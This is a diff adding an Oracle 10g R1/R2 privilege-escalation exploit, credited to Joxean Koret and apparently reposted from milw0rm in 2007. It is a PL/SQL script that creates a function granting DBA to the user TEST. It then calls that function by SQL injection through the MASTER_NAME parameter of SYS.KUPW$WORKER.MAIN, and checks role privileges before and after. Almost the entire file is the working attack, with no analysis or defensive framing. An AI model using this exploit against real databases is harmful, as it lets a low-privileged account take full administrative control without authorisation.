@@ -1,0 +1,42 @@
+/**
+* Exploit for Oracle10g R1 and R2 prior to CPU Oct 2006
+* Joxean Koret <joxeankoret@yahoo.es>
+* Privileges needed:
+*
+* - CREATE SESSION
+* - CREATE PROCEDURE
+*
+*/
+select *
+from user_role_privs
+;
+
+CREATE OR REPLACE FUNCTION F1
+RETURN NUMBER AUTHID CURRENT_USER
+IS
+PRAGMA AUTONOMOUS_TRANSACTION;
+BEGIN
+EXECUTE IMMEDIATE 'GRANT DBA TO TEST';
+COMMIT;
+RETURN(1);
+END;
+/
+
+DECLARE
+MASTER_NAME VARCHAR2(200);
+MASTER_OWNER VARCHAR2(200);
+BEGIN
+MASTER_NAME := ''' or ' || user || '.f1=1--';
+MASTER_OWNER := 'bla';
+SYS.KUPW$WORKER.MAIN(
+MASTER_NAME => MASTER_NAME,
+MASTER_OWNER => MASTER_OWNER
+);
+END;
+/
+
+select *
+from user_role_privs
+;
+
+// milw0rm.com [2007-01-23]
